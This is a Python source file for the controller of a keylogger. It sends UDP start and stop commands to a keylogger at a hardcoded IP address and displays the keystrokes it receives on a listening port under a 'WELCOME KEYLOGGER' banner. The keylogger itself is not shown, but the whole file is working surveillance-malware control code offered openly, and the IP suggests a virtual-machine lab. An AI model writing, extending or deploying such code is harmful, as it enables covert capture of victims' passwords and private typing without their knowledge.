"""
@author: Vuong Van Duy
controller.py
data: 14.10.2025

This script implements a controller that can send UDP commands to start and stop a keylogger.
It also listens for incoming UDP messages from the keylogger to display captured keystrokes.
The controller runs a listener in a separate thread and allows user input to control the keylogger.
"""

import socket, os
import json
import threading

IP = '10.0.2.15'

banner = """
★彡━━━━━━━━━━━★ Ｗ Ｅ Ｌ Ｃ Ｏ Ｍ Ｅ   Ｋ Ｅ Ｙ Ｌ Ｏ Ｇ Ｇ Ｅ Ｒ ★━━━━━━━━━━━━彡★
"""

class ControllerServer:
    def __init__(self, host: str = "127.0.0.1", port_listen: int = 9999, port_send: int = 9998):
        self.host = host
        self.port_listen = port_listen
        self.port_send = port_send
        self.buffer = ""

    def send_command(self, message: bool, timeout: float = 2.0):

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "command": message
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                print(f"Đã gửi {sent} bytes tới {self.host}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def listen_clients(self, buffer_size: int = 4096):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        sock.settimeout(0.5)
        print(f"UDP server listening on {self.host}:{self.port_listen} (press Ctrl+C to stop)")

        try:
            while True:
                try:
                    data, _ = sock.recvfrom(buffer_size)
                    data = json.loads(data.decode())
                    data_str = data.get("message", "")
                    signal = data.get("signal", False)
                    if signal:
                        self.buffer += data_str
                        os.system('clear')
                        print("\033[32m" + banner + "\033[0m")
                        print("Keystroke operation ->", self.buffer)
                        print("Enter 'stop' to stop, 'exit' to quit... ->")
                    else:
                        os.system('clear')
                        print("\033[32m" + banner + "\033[0m")
                        self.buffer = ""
                        print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
                except socket.timeout as e:
                    pass
                except json.JSONDecodeError as e:
                    pass
                except OSError as e:
                    print("Socket error:", e)
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            print("Socket closed. Bye.")

def send_loop(controller: ControllerServer):
    while True:
        command = input("Send cmd (start/stop/exit): ").strip().lower()
        if command == "start":
            controller.send_command(True)
        elif command == "stop":
            controller.send_command(False)
        elif command == "exit":
            print("Exiting...")
            break
        else:
            print("Unknown command.")

def main():
    controller = ControllerServer(host=IP)
    listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
    listener_thread.start()
    print("\033[32m" + banner + "\033[0m")
    while True:
        command = input("Send cmd (start/stop/exit): ").strip().lower()
        if command == "start":
            controller.send_command(True)
        elif command == "stop":
            controller.send_command(False)
        elif command == "exit":
            print("Exiting...")
            break
        else:
            print("Unknown command.")

if __name__ == "__main__":
    main()
